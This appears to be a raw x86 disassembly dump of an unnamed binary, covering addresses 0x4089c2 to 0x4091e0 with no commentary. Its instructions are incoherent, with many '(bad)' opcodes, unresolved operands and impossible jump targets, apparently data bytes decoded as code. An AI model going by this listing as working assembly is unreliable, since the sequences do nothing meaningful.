  4089c2:	xor    al,0xff
  4089c4:	add    bh,ch
  4089c6:	pop    esp
  4089c7:	add    BYTE PTR [esi],dl
  4089c9:	(bad)  
  4089ca:	cmp    al,0x0
  4089cc:	int3   
  4089cd:	sub    esi,DWORD PTR [ebx]
  4089cf:	dec    DWORD PTR [eax-0x1]
  4089d2:	mov    esp,cs
  4089d4:	mov    DWORD PTR [ebx],esp
  4089d6:	xlat   BYTE PTR ds:[ebx]
  4089d7:	mov    DWORD PTR [ecx-0x34],esi
  4089da:	mov    ?,edi
  4089dc:	call   FWORD PTR [edx]
  4089de:	add    al,0xff
  4089e0:	daa    
  4089e1:	add    al,dl
  4089e3:	mov    esp,ecx
  4089e5:	push   esp
  4089e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089e7:	add    dh,ah
  4089e9:	(bad)  
  4089ea:	mov    esp,0xc86600ff
  4089ef:	(bad)  
  4089f0:	mov    edx,0xff004700
  4089f5:	mov    dl,0x53
  4089f7:	add    BYTE PTR [esi-0x1],bh
  4089fa:	aam    0xcc
  4089fc:	inc    DWORD PTR [ebp-0xce0024]
  408a02:	mov    dh,0x0
  408a04:	or     DWORD PTR [ecx],0xffffffbc
  408a07:	add    BYTE PTR ds:0xccff1900,ch
  408a0d:	mov    DWORD PTR [edi],0xde0067ff
  408a13:	add    bh,bh
  408a15:	xchg   esi,eax
  408a16:	xchg   edi,eax
  408a17:	jmp    FWORD PTR [edi-0x34]
  408a1a:	rol    DWORD PTR [eax],cl
  408a1c:	call   FWORD PTR [ecx-0xb500b6]
  408a22:	mov    eax,ds:0xc7f900ff
  408a27:	add    BYTE PTR [eax-0x7d],ah
  408a2a:	mov    bh,0xff
  408a2c:	jmp    esp
  408a2e:	jns    0x408a30
  408a30:	loopne 0x408a32
  408a32:	addr16 (bad) 
  408a34:	inc    ebp
  408a36:	mov    ebx,0x6aff0cff
  408a3b:	cmp    edi,0x12
  408a3e:	int3   
  408a3f:	add    BYTE PTR [edi+edi*8],ch
  408a42:	dec    eax
  408a43:	add    BYTE PTR [eax],al
  408a45:	pushf  
  408a46:	pop    edx
  408a47:	call   DWORD PTR [esi-0x7d]
  408a4a:	lahf   
  408a4b:	add    ah,cl
  408a4d:	dec    esp
  408a4e:	nop
  408a4f:	add    BYTE PTR [ebp-0x8900],bh
  408a55:	or     eax,0xff86ffac
  408a5a:	mov    bl,0xff
  408a5c:	add    BYTE PTR [edx+0x7],dh
  408a5f:	adc    ebp,0xffffffff
  408a62:	push   ecx
  408a63:	inc    DWORD PTR [eax]
  408a65:	push   ebx
  408a66:	or     edi,edi
  408a68:	rol    BYTE PTR [eax],cl
  408a6a:	stos   BYTE PTR es:[edi],al
  408a6b:	inc    DWORD PTR [eax]
  408a6d:	mov    bh,0x88
  408a6f:	add    BYTE PTR [ecx-0xbe00],ah
  408a75:	fld    TBYTE PTR [edi]
  408a77:	call   DWORD PTR [ebx+0x0]
  408a7a:	inc    DWORD PTR ss:[eax]
  408a7d:	sbb    BYTE PTR [edi+0x0],bh
  408a80:	push   edi
  408a81:	mov    DWORD PTR [edi],ecx
  408a83:	inc    DWORD PTR [ebx-0x7bff6b95]
  408a89:	push   ebx
  408a8b:	add    bh,bh
  408a8d:	add    DWORD PTR [edi],ebp
  408a8f:	add    BYTE PTR [edi],bh
  408a91:	add    ah,ah
  408a93:	dec    esp
  408a95:	fsubr  DWORD PTR [edi+edi*8+0x20]
  408a99:	push   DWORD PTR [ebp+0x49b70000]
  408a9f:	add    BYTE PTR [ecx],dl
  408aa1:	add    BYTE PTR [eax-0x1],al
  408aa4:	mov    DWORD PTR [edi+0x53006a],esp
  408aaa:	or     al,0xff
  408aac:	mov    DWORD PTR [edx+ebx*4+0x0],esi
  408ab0:	sar    edi,cl
  408ab2:	pop    eax
  408ab3:	mov    edi,edi
  408ab5:	nop
  408ab6:	mov    al,ds:0x7008dff
  408abb:	(bad)  
  408abc:	(bad)  
  408abd:	jmp    0xffd15731
  408ac2:	fild   DWORD PTR [eax]
  408ac4:	add    BYTE PTR [eax-0x7c973359],al
  408aca:	mov    ebx,0x4c2affff
  408acf:	add    BYTE PTR [ebx-0xffb301],bh
  408ad5:	mov    ch,BYTE PTR [esi-0x1]
  408ad8:	push   0xffff3100
  408add:	sub    al,0x3a
  408adf:	add    bh,bl
  408ae1:	call   FWORD PTR [ecx-0x4964ff01]
  408ae7:	add    cl,bh
  408ae9:	int3   
  408aea:	rol    BYTE PTR [eax],1
  408aec:	add    BYTE PTR [esi+0x20],dl
  408aef:	(bad)  
  408af0:	jmp    0xccc45378
  408af5:	stc    
  408af6:	inc    eax
  408af7:	call   DWORD PTR [edx]
  408af9:	mov    ebx,edi
  408afb:	inc    DWORD PTR [ebx-0x64fffdae]
  408b01:	inc    DWORD PTR [edi-0x5dcc7700]
  408b07:	sub    DWORD PTR [eax+eax*1+0x1dcc005f],0xffffff88
  408b0f:	cmp    DWORD PTR [eax-0x34],0x13
  408b13:	add    DWORD PTR [ebx-0x2f7c63cd],0x0
  408b1a:	and    DWORD PTR [eax],eax
  408b1c:	jmp    FWORD PTR [ebx-0x1b0017]
  408b22:	or     bh,bh
  408b24:	add    BYTE PTR [eax-0x2e],ah
  408b27:	jmp    FWORD PTR [eax+0x0]
  408b2a:	cmp    al,BYTE PTR [eax]
  408b2c:	add    BYTE PTR [edx+0x4d],bl
  408b2f:	(bad)  
  408b30:	fimul  DWORD PTR [ecx+0x6aff83de]
  408b36:	adc    ah,cl
  408b38:	push   esi
  408b39:	push   DWORD PTR [edi+edi*8-0x7c97b300]
  408b40:	sub    DWORD PTR [ebx+0x14ff00ec],eax
  408b46:	(bad)  
  408b47:	mov    DWORD PTR [ebx-0x1],ebx
  408b4a:	push   esi
  408b4b:	inc    DWORD PTR [eax]
  408b4d:	lods   eax,DWORD PTR ds:[esi]
  408b4e:	inc    eax
  408b4f:	call   FWORD PTR [eax-0x5c01]
  408b55:	inc    ebx
  408b56:	push   ds
  408b57:	add    BYTE PTR [eax+eax*1+0x7e],al
  408b5b:	inc    DWORD PTR [eax]
  408b5d:	xor    eax,0x835f006a
  408b62:	add    DWORD PTR [bp+di-0x3d6d],0xffffffff
  408b68:	test   DWORD PTR [ebx-0x4800fff0],eax
  408b6e:	push   edi
  408b6f:	add    eax,0xffffff83
  408b72:	repnz cmp edi,0x3a
  408b76:	cmp    edi,0xebff72
  408b7c:	(bad)  
  408b7d:	jp     0x408b46
  408b7f:	add    BYTE PTR [edi-0x1],ah
  408b82:	or     ecx,esp
  408b84:	add    BYTE PTR [ebp-0x25],al
  408b87:	int3   
  408b88:	mov    cl,0x89
  408b8a:	inc    DWORD PTR fs:[eax]
  408b8d:	pop    edx
  408b8e:	mov    BYTE PTR [ebx-0x300048],0x83
  408b95:	idiv   DWORD PTR [ecx]
  408b97:	sbb    DWORD PTR [ebx-0xee01],0x42
  408b9e:	mov    ds:0x15833aff,eax
  408ba3:	int3   
  408ba4:	mov    ecx,ecx
  408ba6:	(bad)  
  408ba9:	call   DWORD PTR [edi+edi*8-0x9ea001]
  408bb0:	jb     0x408bb1
  408bb2:	out    0x0,al
  408bb4:	dec    DWORD PTR [edi-0x3e]
  408bb7:	inc    DWORD PTR [ebx+0x8925ff]
  408bbd:	xchg   esp,eax
  408bbe:	pusha  
  408bbf:	(bad)  
  408bc0:	cmp    esp,ecx
  408bc2:	sub    al,0xcc
  408bc4:	add    bl,dl
  408bc6:	int3   
  408bc7:	add    BYTE PTR [eax-0x7d],ch
  408bca:	push   edi
  408bcb:	inc    DWORD PTR [eax]
  408bcd:	in     al,0x6b
  408bcf:	xor    edx,0xffffff83
  408bd2:	(bad)  
  408bd3:	inc    DWORD PTR [eax]
  408bd5:	push   esi
  408bd6:	mov    eax,ds:0x54ff07ff
  408bdb:	(bad)  
  408bdc:	(bad)  
  408bdd:	cmp    edi,edi
  408bdf:	add    BYTE PTR [esi+0x0],bh
  408be2:	test   al,0xff
  408be4:	mov    DWORD PTR [edi-0xcf0083],esi
  408bea:	or     BYTE PTR [ebx-0x873400],al
  408bf0:	jae    0x408bf1
  408bf2:	(bad)  
  408bf3:	inc    DWORD PTR [ebx-0x120031f4]
  408bf9:	add    BYTE PTR [eax+eax*1+0xb4ef83],bh
  408c00:	enter  0x99ff,0x83
  408c04:	dec    esi
  408c06:	xlat   BYTE PTR ds:[ebx]
  408c07:	jmp    FWORD PTR [esi-0x76002f00]
  408c0d:	sub    eax,0x92005b
  408c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c13:	(bad)  
  408c14:	jmp    DWORD PTR [eax]
  408c16:	push   esp
  408c17:	add    BYTE PTR [ebp-0x1],ch
  408c1a:	mov    es,WORD PTR [eax]
  408c1c:	inc    DWORD PTR [edx-0x3600a9]
  408c22:	jge    0x408c23
  408c24:	or     DWORD PTR [edi-0x527c8b],0x60
  408c2b:	cmp    edi,0x78
  408c2e:	add    DWORD PTR [ebx-0x90015],0xffffffff
  408c35:	adc    BYTE PTR [ebx-0x1],ch
  408c38:	je     0x408c06
  408c3a:	cmp    eax,0xf5418383
  408c3f:	inc    DWORD PTR [eax+eax*1+0xf]
  408c43:	add    BYTE PTR [ebx-0x4dffc58e],al
  408c49:	add    BYTE PTR [edx],ch
  408c4b:	mov    DWORD PTR [eax],eax
  408c4d:	ficomp WORD PTR [edx]
  408c4f:	add    BYTE PTR [esi+0xff6383],ah
  408c55:	inc    eax
  408c56:	push   esi
  408c57:	call   DWORD PTR [ebx+eax*4+0x14]
  408c5b:	dec    esp
  408c5d:	sahf   
  408c5e:	xlat   BYTE PTR ds:[ebx]
  408c5f:	add    BYTE PTR [edx],bh
  408c61:	add    BYTE PTR [ebx-0x1],cl
  408c64:	add    ah,bl
  408c66:	cli    
  408c67:	sub    DWORD PTR [edx+0x0],0xffffffe9
  408c6b:	add    bh,bh
  408c6d:	cwde   
  408c6e:	push   ebp
  408c6f:	add    BYTE PTR [esi],ch
  408c71:	sbb    DWORD PTR [ebx+eax*4-0x420d00],0xffffffcc
  408c79:	int3   
  408c7a:	int3   
  408c7b:	int3   
  408c7c:	int3   
  408c7d:	int3   
  408c7e:	int3   
  408c7f:	int3   
  408c80:	(bad)  
  408c81:	inc    esp
  408c83:	lds    ebx,FWORD PTR [ecx]
  408c85:	add    BYTE PTR [edi+edi*8-0x337c38],cl
  408c8c:	inc    esi
  408c8d:	inc    DWORD PTR [esi+0x4c]
  408c90:	(bad)  
  408c91:	inc    esi
  408c93:	xor    esi,0xffffffff
  408c96:	scas   eax,DWORD PTR es:[edi]
  408c97:	add    bh,ch
  408c99:	add    BYTE PTR [eax],al
  408c9b:	add    BYTE PTR [ecx+0x0],bl
  408c9e:	int    0x9a
  408ca0:	inc    DWORD PTR [eax]
  408ca2:	aam    0x26
  408ca4:	inc    edx
  408ca5:	add    BYTE PTR [edx-0x1],al
  408ca8:	pop    edi
  408ca9:	(bad)  
  408caa:	inc    DWORD PTR [eax]
  408cac:	inc    ebp
  408cad:	int3   
  408cae:	sub    BYTE PTR [edi+0x0],0xff
  408cb2:	dec    ecx
  408cb3:	out    dx,al
  408cb4:	dec    ebp
  408cb5:	add    BYTE PTR [esi-0x7d],al
  408cb8:	scas   al,BYTE PTR es:[edi]
  408cb9:	inc    DWORD PTR [ebx-0x6400ea01]
  408cbf:	call   0x4e6a8cc3
  408cc4:	rol    BYTE PTR [eax],cl
  408cc6:	push   ss
  408cc7:	jmp    DWORD PTR [edi+edi*8-0x1]
  408ccb:	int3   
  408ccc:	xchg   edi,edi
  408cce:	repz sar edi,0xff
  408cd2:	scas   al,BYTE PTR es:[edi]
  408cd3:	push   es
  408cd4:	aaa    
  408cd5:	add    bh,al
  408cd7:	inc    DWORD PTR [edx]
  408cd9:	int3   
  408cda:	(bad)  
  408cdb:	(bad)  
  408cdc:	out    dx,al
  408cdd:	push   DWORD PTR ds:0x18ff00e3
  408ce3:	pusha  
  408ce4:	(bad)  
  408ce5:	call   FWORD PTR [esi-0x1]
  408ce8:	xchg   esi,eax
  408ce9:	(bad)  
  408cea:	inc    DWORD PTR [eax]
  408cec:	mov    dl,0xff
  408cee:	shr    BYTE PTR [eax],cl
  408cf0:	int3   
  408cf1:	call   FWORD PTR [ecx-0x3]
  408cf4:	adc    eax,0xfff7d00
  408cf9:	add    BYTE PTR [eax],al
  408cfb:	sbb    edx,0x0
  408cfe:	jne    0x408cff
  408d00:	(bad)  
  408d01:	jmp    ebx
  408d03:	push   ebp
  408d04:	xor    al,BYTE PTR [eax]
  408d06:	xor    eax,DWORD PTR [eax]
  408d08:	test   DWORD PTR [ebx-0xee0000],0xfffdf8
  408d12:	das    
  408d13:	sbb    al,0x87
  408d15:	add    ebp,0xffffff89
  408d18:	into   
  408d19:	(bad)  
  408d1a:	inc    DWORD PTR [eax]
  408d1c:	jge    0x408d1e
  408d1e:	rcr    dl,0xcc
  408d21:	mov    DWORD PTR [ecx],esp
  408d23:	adc    al,0x3c
  408d25:	call   DWORD PTR [edi+edi*8]
  408d28:	pop    ebx
  408d29:	int3   
  408d2a:	add    bh,bh
  408d2c:	sub    bh,bh
  408d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d2f:	mov    WORD PTR [eax],es
  408d31:	inc    DWORD PTR [ebx]
  408d33:	stc    
  408d34:	mov    al,ds:0xcdffecff
  408d39:	int3   
  408d3a:	(bad)  
  408d3b:	(bad)  
  408d3c:	(bad)  
  408d3d:	dec    eax
  408d3f:	out    0x0,eax
  408d41:	cmp    DWORD PTR [edx+0x7e006f46],0x0
  408d48:	mov    edi,0x818383ff
  408d4d:	add    BYTE PTR ds:0x43ff8374,dl
  408d53:	push   edx
  408d54:	rol    DWORD PTR [eax],0xa
  408d57:	int3   
  408d58:	inc    DWORD PTR ds:[eax]
  408d5b:	add    BYTE PTR [ecx-0x7c813f01],dl
  408d61:	add    BYTE PTR [esi],ch
  408d63:	jmp    0x408db4
  408d65:	inc    DWORD PTR [ebx-0x337c7d]
  408d6b:	call   DWORD PTR [eax-0x1]
  408d6e:	push   edx
  408d6f:	push   edx
  408d70:	add    BYTE PTR [ebx-0x7cdf8f0a],al
  408d76:	sub    DWORD PTR fs:[eax+0x7d0000cc],0x0
  408d7e:	jno    0x408ddb
  408d80:	add    bh,bh
  408d82:	loop   0x408d28
  408d84:	test   bh,bh
  408d86:	ds push eax
  408d89:	add    DWORD PTR [eax],0xffffffff
  408d8c:	sbb    DWORD PTR [ecx-0xff5de9],ecx
  408d92:	sbb    al,0xdc
  408d94:	std    
  408d95:	add    BYTE PTR [eax+eax*1+0xff0064],ah
  408d9c:	pop    esi
  408d9d:	call   DWORD PTR [ecx+0x37]
  408da0:	(bad)  
  408da1:	call   edi
  408da3:	retf   0xff1b
  408da6:	inc    esp
  408da7:	sbb    DWORD PTR [ebx-0x43000001],0x0
  408dae:	add    esi,DWORD PTR ds:0xcdabffff
  408db4:	pop    ebx
  408db5:	add    BYTE PTR [ebx],dh
  408db7:	mov    DWORD PTR [ebx-0x74007c7d],ebp
  408dbd:	add    BYTE PTR [ebx+0x78],dh
  408dc0:	(bad)  
  408dc1:	push   DWORD PTR ds:0xf83233e
  408dc7:	mov    DWORD PTR [ebp-0x1],esi
  408dca:	dec    esp
  408dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dcd:	sub    DWORD PTR [ecx+0x39],0x0
  408dd1:	sub    DWORD PTR [eax+0x10009be],0xffffffff
  408dd8:	cmp    al,0x0
  408dda:	add    DWORD PTR [ebx+0x3cbfff1c],0xffffff89
  408de1:	add    BYTE PTR [edi+ecx*8],al
  408de4:	mov    ecx,esp
  408de6:	rol    DWORD PTR [ebx+0xcc29],1
  408dec:	xor    ecx,esp
  408dee:	test   al,0x82
  408df0:	int3   
  408df1:	add    BYTE PTR [edx],dl
  408df3:	or     DWORD PTR [eax+eax*1+0x78],0xff6789
  408dfb:	jmp    FWORD PTR ds:0xd6af83
  408e01:	add    BYTE PTR [edi+0xa],dl
  408e04:	cmc    
  408e05:	push   edx
  408e07:	call   DWORD PTR [edx]
  408e09:	dec    esp
  408e0b:	call   DWORD PTR [eax+eax*1-0x7c004bef]
  408e12:	dec    esp
  408e13:	repz ret 
  408e15:	(bad)  
  408e16:	cmp    ecx,DWORD PTR [ecx+0xffff88]
  408e1c:	lea    ecx,[ecx-0x7c0074c8]
  408e22:	mov    bh,0xb2
  408e24:	xor    al,0x83
  408e26:	and    al,0x0
  408e28:	jnp    0x408e29
  408e2a:	add    BYTE PTR [eax],al
  408e2c:	cmp    edi,0xcc001016
  408e32:	pop    ds
  408e33:	sbb    al,BYTE PTR [edi]
  408e35:	add    BYTE PTR [eax],al
  408e37:	add    BYTE PTR [edi],cl
  408e39:	inc    DWORD PTR [ebx-0x187cbb01]
  408e3f:	std    
  408e40:	inc    DWORD PTR [eax]
  408e42:	aam    0x4b
  408e44:	adc    eax,0x1e0076ff
  408e49:	(bad)  
  408e4a:	inc    DWORD PTR [eax]
  408e4c:	imul   eax,DWORD PTR [ebx-0x7cae69],0xff241607
  408e56:	cwde   
  408e57:	add    BYTE PTR [edi-0x51007601],dh
  408e5d:	add    BYTE PTR [ebx+0x4400ffc0],ch
  408e63:	pop    ds
  408e64:	(bad)  
  408e65:	add    BYTE PTR [edi+edi*8+0x76],ah
  408e69:	mov    DWORD PTR [ebx+0x73ff25ff],eax
  408e6f:	add    edi,edi
  408e71:	jmp    ebx
  408e73:	pop    ecx
  408e74:	cmp    al,0xff
  408e76:	icebp  
  408e77:	dec    DWORD PTR [edx+0x7e8300ff]
  408e7d:	int3   
  408e7e:	and    edx,DWORD PTR [esi+0x0]
  408e81:	or     DWORD PTR [edx+esi*2-0x980005],0xffffff9a
  408e89:	int3   
  408e8a:	add    BYTE PTR [ebx-0x3a8000a3],al
  408e90:	add    ah,cl
  408e92:	cmc    
  408e93:	xor    eax,0xcffa5
  408e98:	ins    DWORD PTR es:[edi],dx
  408e99:	add    bh,bh
  408e9b:	call   FWORD PTR [ebp-0x1]
  408e9e:	push   edx
  408e9f:	adc    bh,bh
  408ea1:	add    BYTE PTR ds:0xad89c478,cl
  408ea7:	add    BYTE PTR [ebp+0x0],cl
  408eaa:	inc    DWORD PTR [ebx-0x7cde0036]
  408eb0:	mov    DWORD PTR [eax],eax
  408eb2:	popa   
  408eb3:	xlat   BYTE PTR ds:[ebx]
  408eb5:	(bad)  
  408eb6:	js     0x408eb7
  408eb8:	jmp    0x408eb9
  408eba:	add    ah,cl
  408ebc:	imul   ecx,esp,0x8900e492
  408ec2:	imul   edi,DWORD PTR [esi],0xdffd0
  408ec8:	adc    eax,0x158300ff
  408ecd:	add    BYTE PTR [esi],dh
  408ecf:	jo     0x408ed1
  408ed1:	(bad)  
  408ed2:	out    dx,eax
  408ed3:	test   DWORD PTR [ebx-0x1],esp
  408ed6:	mov    dl,0xff
  408ed8:	stos   BYTE PTR es:[edi],al
  408ed9:	dec    DWORD PTR [ecx+0x51cc66cc]
  408edf:	cdq    
  408ee0:	inc    DWORD PTR [eax]
  408ee2:	push   edx
  408ee3:	mov    esp,0x890f00cb
  408ee8:	push   eax
  408ee9:	add    ah,cl
  408eeb:	xor    edi,0x0
  408eee:	mov    ch,0x2b
  408ef0:	add    DWORD PTR [ebx-0x151560],0x1f
  408ef7:	inc    esp
  408ef9:	mov    edi,edi
  408efb:	add    BYTE PTR [edx],cl
  408efd:	(bad)  
  408efe:	clc    
  408eff:	das    
  408f00:	add    BYTE PTR [eax],al
  408f02:	ret    
  408f03:	mov    esi,0x9dff93
  408f08:	mov    bh,bh
  408f0a:	(bad)  
  408f0b:	(bad)  
  408f0c:	in     al,dx
  408f0d:	add    BYTE PTR ds:0xebccffad,dl
  408f13:	inc    ebx
  408f14:	repnz call FWORD PTR [esi]
  408f17:	jmp    DWORD PTR [esi-0x61000001]
  408f1d:	add    BYTE PTR [edx+edi*2+0x0],ch
  408f21:	jmp    FWORD PTR [edx]
  408f23:	je     0x408f7e
  408f25:	push   DWORD PTR [edi+0x8931ff]
  408f2b:	sbb    DWORD PTR [edx],0xffffffff
  408f2e:	dec    ecx
  408f30:	add    bh,bh
  408f32:	fsub   QWORD PTR [esi]
  408f34:	sub    al,0xff
  408f36:	push   ss
  408f37:	int3   
  408f38:	xchg   ebx,eax
  408f39:	add    DWORD PTR [eax],0xffffff89
  408f3c:	rol    BYTE PTR [ebx-0x7cffbebe],0x47
  408f43:	pop    ss
  408f44:	iret   
  408f45:	add    BYTE PTR [esi-0x7cfffe7d],dl
  408f4b:	dec    DWORD PTR [edi+0x0]
  408f4e:	sti    
  408f4f:	sbb    eax,0x5bf5ffff
  408f54:	leave  
  408f55:	or     DWORD PTR [eax],0xffffff89
  408f58:	and    edi,edi
  408f5a:	add    BYTE PTR [eax],al
  408f5c:	enter  0xa083,0x60
  408f60:	add    DWORD PTR [eax],0xffffffa2
  408f63:	shr    BYTE PTR [ebx-0x75000034],1
  408f69:	inc    DWORD PTR [eax]
  408f6b:	jmp    DWORD PTR [eax-0x1]
  408f6e:	sbb    al,0xa7
  408f70:	(bad)  
  408f71:	jmp    FWORD PTR [ebx+0x1c00b8a6]
  408f77:	inc    esp
  408f79:	mov    edi,edi
  408f7b:	sbb    esp,0xffffffff
  408f7e:	(bad)  
  408f7f:	test   BYTE PTR [eax],0xff
  408f82:	shl    BYTE PTR [ebx+0xe300fc],cl
  408f88:	sbb    al,BYTE PTR [eax]
  408f8a:	mov    edi,edi
  408f8c:	mov    al,ds:0xffd9bc00
  408f91:	add    bh,dl
  408f93:	mov    ds,WORD PTR [ecx-0x7b004801]
  408f99:	add    BYTE PTR [eax],al
  408f9b:	or     DWORD PTR [esi],0xffffffff
  408f9e:	cwde   
  408f9f:	mov    edi,0xc9acc00
  408fa4:	sbb    eax,DWORD PTR [eax]
  408fa6:	jo     0x408fa8
  408fa8:	mov    cl,0xff
  408faa:	(bad)  
  408fab:	call   DWORD PTR [esi-0x7c09aa01]
  408fb1:	(bad)  
  408fb2:	jg     0x408f71
  408fb4:	mov    edx,0xd9ffb400
  408fb9:	add    bh,bh
  408fbb:	add    DWORD PTR ds:0x47ba89,0xffffff83
  408fc2:	xchg   esp,eax
  408fc3:	push   0xffd68304
  408fc8:	add    DWORD PTR [ebx-0x3364007d],0xff89019f
  408fd2:	sub    ebx,esi
  408fd4:	jne    0x408fd5
  408fd6:	push   eax
  408fd7:	call   DWORD PTR [edi]
  408fd9:	inc    DWORD PTR [ebx+0x69ffb700]
  408fdf:	sbb    edi,edi
  408fe1:	add    BYTE PTR [esi],bh
  408fe3:	dec    eax
  408fe4:	into   
  408fe5:	jmp    DWORD PTR [eax-0x76002900]
  408feb:	int3   
  408fec:	repnz int3 
  408fee:	push   cs
  408fef:	pop    ebx
  408ff0:	inc    DWORD PTR [eax]
  408ff2:	jb     0x409057
  408ff4:	int3   
  408ff5:	mov    DWORD PTR [eax+eax*1+0x54],edx
  408ff9:	mov    DWORD PTR [ebx-0x4900d700],eax
  408fff:	fisttp DWORD PTR [ecx-0x56b98901]
  409005:	add    al,ch
  409007:	xor    DWORD PTR [edi+edi*8-0x1],0xffffffff
  40900c:	aas    
  40900d:	add    dl,al
  40900f:	inc    edi
  409010:	mov    edi,edi
  409012:	rol    DWORD PTR [edx+edx*4],cl
  409015:	xor    edi,0x0
  409018:	add    eax,0x79ff0000
  40901d:	int3   
  40901e:	sar    cl,0xff
  409021:	(bad)  
  409022:	jmp    0x409025
  409024:	push   0xffffff89
  409026:	(bad)  
  409027:	jmp    FWORD PTR ds:0xfcffff89
  40902d:	jmp    DWORD PTR [edi-0x31ff3327]
  409033:	idiv   DWORD PTR [edi+edi*8]
  409036:	mov    eax,0x838993ff
  40903b:	push   DWORD PTR [ecx]
  40903d:	push   esp
  40903f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409040:	add    bh,bh
  409042:	icebp  
  409043:	dec    esi
  409044:	xchg   ebx,eax
  409045:	push   DWORD PTR [edi-0xab01]
  40904b:	or     eax,0xffffff89
  40904e:	xchg   ecx,eax
  40904f:	test   al,0xff
  409051:	(bad)  
  409052:	std    
  409053:	je     0x40908e
  409055:	call   FWORD PTR [ebp+0xffb400]
  40905b:	add    BYTE PTR [eax-0x7c980b01],bh
  409061:	jmp    FWORD PTR [ebx+0x6b]
  409064:	mov    es,WORD PTR [eax]
  409066:	mov    BYTE PTR [eax],al
  409068:	inc    eax
  409069:	add    DWORD PTR [eax],0x0
  40906c:	call   0x7f89:0xff562100
  409073:	or     BYTE PTR ds:0xdcff32ff,dl
  409079:	int3   
  40907a:	inc    DWORD PTR [eax]
  40907c:	dec    esp
  40907d:	(bad)  
  40907e:	inc    DWORD PTR [esi]
  409080:	inc    DWORD PTR [eax]
  409082:	pop    esi
  409083:	gs sub eax,0x4e004100
  409089:	inc    DWORD PTR [ebx+0x1dffa700]
  40908f:	inc    edi
  409090:	(bad)  
  409091:	jmp    edi
  409093:	mov    edx,0x29ff29
  409098:	mov    WORD PTR [eax],es
  40909a:	mov    edi,edi
  40909c:	jmp    0x1a3fa1
  4090a1:	call   ebx
  4090a3:	or     al,BYTE PTR [eax+0x0]
  4090a6:	sub    BYTE PTR [ebx-0x76007cc2],al
  4090ac:	icebp  
  4090ad:	add    BYTE PTR [eax-0x39],dh
  4090b0:	inc    DWORD PTR [eax]
  4090b2:	sbb    eax,0x67ff4658
  4090b7:	call   FWORD PTR [edx+0x0]
  4090ba:	inc    DWORD PTR [eax]
  4090bc:	(bad)  
  4090bd:	(bad)  
  4090be:	cli    
  4090bf:	push   edi
  4090c0:	add    BYTE PTR [ebx-0x1d255d],al
  4090c6:	add    DWORD PTR [ebx-0x7c0000c5],0x790cff70
  4090d0:	add    BYTE PTR [eax],al
  4090d2:	xchg   edi,eax
  4090d3:	cmp    al,0x7b
  4090d5:	adc    DWORD PTR [esi],0x0
  4090d8:	std    
  4090d9:	(bad)  
  4090da:	inc    DWORD PTR [ebx-0x34397685]
  4090e0:	add    bh,bh
  4090e2:	cwde   
  4090e3:	jge    0x409065
  4090e5:	int3   
  4090e6:	outs   dx,DWORD PTR ds:[esi]
  4090e7:	jmp    DWORD PTR [edx]
  4090e9:	dec    esp
  4090eb:	push   DWORD PTR [esi+0x0]
  4090ee:	js     0x4090dc
  4090f0:	mov    DWORD PTR [eax],eax
  4090f2:	aam    0xfc
  4090f4:	mov    BYTE PTR [eax],al
  4090f6:	sub    al,BYTE PTR [ebx+0xff8387]
  4090fc:	in     eax,0x83
  4090fe:	inc    edx
  4090ff:	jecxz  0x409100
  409101:	jmp    FWORD PTR [ecx]
  409103:	das    
  409104:	stos   DWORD PTR es:[edi],eax
  409105:	sub    DWORD PTR [esi+0xffd800],0xffffffff
  40910c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910d:	call   eax
  40910f:	push   ebx
  409110:	add    bh,bh
  409112:	and    BYTE PTR [ecx-0x2d],ch
  409115:	(bad)  
  409116:	jnp    0x409117
  409118:	mov    dh,0xff
  40911a:	add    bh,bh
  40911c:	jle    0x4090a7
  40911e:	mov    esi,0xf7ffffe3
  409123:	pop    ss
  409124:	jo     0x4090f2
  409126:	jmp    0x409128
  409128:	mov    edi,?
  40912a:	add    bh,bh
  40912c:	cwde   
  40912d:	push   ebp
  40912f:	sti    
  409130:	cmp    edi,0x6f
  409133:	or     al,0x21
  409135:	int3   
  409136:	pop    ebp
  409137:	mov    esi,ebp
  409139:	add    BYTE PTR [eax],al
  40913b:	sbb    DWORD PTR [eax],0xffffffff
  40913e:	adc    ebp,DWORD PTR [esi+0x430ff83]
  409144:	jmp    0xcc00:0x8005283
  40914b:	jmp    DWORD PTR [edx]
  40914d:	(bad)  
  40914e:	out    dx,al
  40914f:	xchg   esi,eax
  409150:	cmp    edi,0xfffffffb
  409153:	mov    esi,0x83d4ffb3
  409158:	pop    ds
  409159:	add    bh,bh
  40915b:	int3   
  40915c:	mov    eax,ds:0x667fff
  409161:	add    BYTE PTR [ebx+0x89754d],dh
  409167:	add    bh,bh
  409169:	dec    DWORD PTR [ecx+0x76002f00]
  40916f:	sar    bh,1
  409171:	add    BYTE PTR [esi-0x60],al
  409174:	stc    
  409175:	add    BYTE PTR [ebx+eax*4-0x7cff00eb],bh
  40917c:	mov    bh,bh
  40917e:	je     0x40918e
  409180:	dec    DWORD PTR [ecx+0xffc6c8]
  409186:	and    DWORD PTR [eax],eax
  409188:	jmp    0x409189
  40918a:	add    BYTE PTR [eax],al
  40918c:	mov    al,ds:0xff89a3ff
  409191:	add    al,cl
  409193:	sbb    al,0xf9
  409195:	add    BYTE PTR [edx-0x7c00c701],bl
  40919b:	call   FWORD PTR [eax+eax*1-0xd2da]
  4091a2:	cmp    al,0x22
  4091a4:	ja     0x4091a5
  4091a6:	push   esp
  4091a7:	(bad)  
  4091a8:	mov    esp,0x3cffffff
  4091ad:	(bad)  
  4091ae:	cmp    ebx,DWORD PTR [ecx-0x1]
  4091b1:	jmp    DWORD PTR [ebx]
  4091b3:	mov    ebp,0xcc040029
  4091b8:	pop    esi
  4091b9:	add    BYTE PTR [eax],al
  4091bb:	int3   
  4091bc:	retf   0xebcc
  4091bf:	ja     0x4091c0
  4091c1:	push   edi
  4091c3:	mov    edi,0x83fd83c1
  4091c8:	push   esi
  4091c9:	int3   
  4091ca:	inc    DWORD PTR [eax]
  4091cc:	and    al,0xff
  4091ce:	jmp    0xba409107
  4091d3:	inc    ecx
  4091d4:	jae    0x4091d5
  4091d6:	dec    ebx
  4091d7:	jmp    DWORD PTR [edx+0x1dffffcc]
  4091dd:	call   FWORD PTR [esi-0x7f]
  4091e0:	inc    DWORD PTR [eax]
